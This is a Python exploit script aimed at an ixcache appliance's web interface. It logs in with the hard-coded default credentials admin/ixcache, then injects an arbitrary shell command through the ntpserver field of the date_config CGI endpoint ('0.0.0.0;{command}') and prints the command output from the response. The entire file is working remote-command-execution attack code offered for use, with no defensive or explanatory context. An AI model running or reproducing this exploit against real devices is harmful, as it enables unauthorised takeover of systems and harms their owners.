import requests
import urllib3
import sys
import re
urllib3.disable_warnings()
proxies = {'http':'http://127.0.0.1:8080'}
def get_cookie(url):
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    data = "username=admin&password=ixcache"
    urls = url+'/login/userverify.cgi'
    res = requests.post(urls,data=data,verify=False,headers=headers,timeout=10)
    try:
        cookie = res.headers.get('Set-Cookie')
        return cookie
    except:
        print("[-] 目标不存在默认密码，请使用正确的账户密码")
        sys.exit()



def sen_paylaod(url,command,cookie):
    urls = url+'/cgi-bin/Maintain/date_config'
    headers = {'Cookie':f'{cookie}','Content-Type': 'application/x-www-form-urlencoded'}
    data = f'ntpserver=0.0.0.0;{command}&year=2021&month=08&day=14&hour=17&minute=04&second=50&tz=Asiz&bcy=Shanghai&ifname=fxp1'
    res = requests.post(urls,data=data,verify=False,headers=headers,proxies=proxies,timeout=10)
    start_string = '</script>'
    end_string = '<body>'
    pattern = f"{re.escape(start_string)}(.*?){re.escape(end_string)}"
    result = re.search(pattern,res.text,re.DOTALL)
    if result:
        content = result.group(1)
        print(content)
    else:
        print('The target may not have any vulnerabilities.')



def main():
    print('Usage: python3 exp.py http://127.0.0.1 ls')
    url = sys.argv[1]
    command = sys.argv[2]
    cookie = get_cookie(url)
    sen_paylaod(url,command,cookie)

main()

    

